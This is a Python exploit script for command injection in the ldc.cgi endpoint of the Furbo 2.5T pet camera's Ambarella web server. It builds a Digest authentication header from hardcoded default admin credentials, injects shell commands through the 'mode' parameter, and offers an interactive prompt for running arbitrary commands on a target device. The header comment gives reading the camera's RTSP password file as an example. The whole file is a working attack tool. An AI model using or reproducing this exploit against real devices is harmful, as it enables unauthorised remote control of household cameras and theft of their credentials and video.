################################################################################################################                                                                                                                                                     [1/3148]
# Command Injection in Furbo 2.5T / Ambarella Web Server                                                                                                                                                                                                                     
# Vulnerable parameters --> X, Y, mode, pano_h_fov, zoom_num, zoom_denum
#
# Note: Some results are getting truncated too much
#       example: cat /dev/adc/furbo2_rtsp.password
#
################################################################################################################

import requests
import hashlib
import argparse
import sys

def attack(target, cmd):
    url = 'http://{0}/cgi-bin/ldc.cgi?mode=; {1} ;'.format(target, cmd)

    ###### Get nonce
    try:
        resp = requests.get(url)
        nonce = resp.headers['WWW-Authenticate'][50:82]
    except:
        print('[!] Could not reach server.')
        sys.exit(0)

    ##### Build authorization header values with custom realm (ycam.com)
    cnonce = '1234567'
    nc = '00000001'
    qop = 'auth'
    auth = 'admin:ycam.com:admin'
    request_uri = 'GET:/'
    ha1 = hashlib.md5(auth.encode()).hexdigest()
    ha2 = hashlib.md5(request_uri.encode()).hexdigest()
    final = ha1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + ha2
    response = hashlib.md5(final.encode()).hexdigest()

    #### Send request
    resp = requests.get(url, headers={'Authorization':'Digest username="admin", realm="ycam.com", nonce="'+nonce+'", uri="/", response="'+response+'", qop=auth, nc=00000001, cnonce="'+cnonce+'"'})
    
    #### Check for 500 in response
    result = resp.content[24:].decode('ascii').strip('/usr/local/bin/test_ldc -F 1 -R 960 -m ; ' + cmd + ' ; -h 1 -v -C 0x0 -z 0/0 -f /tmp/ldc/ldc >> /tmp/ldc/ldc_config &')
    if '500 - Internal Server Error' in result:
        print('Error with command...')
    else:
        print(result.strip())


def main():
    # Create user arguments
    parser = argparse.ArgumentParser(prog='ambarella_ldc_cmd_inj.py', description='Exploit command injection in ldc.cgi')
    parser.add_argument('-t', '--target', action='store', type=str, required=True, help='IP address of the Furbo')
    args = parser.parse_args()

    print('Enter command... (Ctrl-c to quit)')
    while True:
        try:
            cmd = input('> ')
            attack(args.target, cmd)
        except KeyboardInterrupt:
            print('\nExiting...')
            sys.exit(0)

if __name__ == '__main__':
    main()

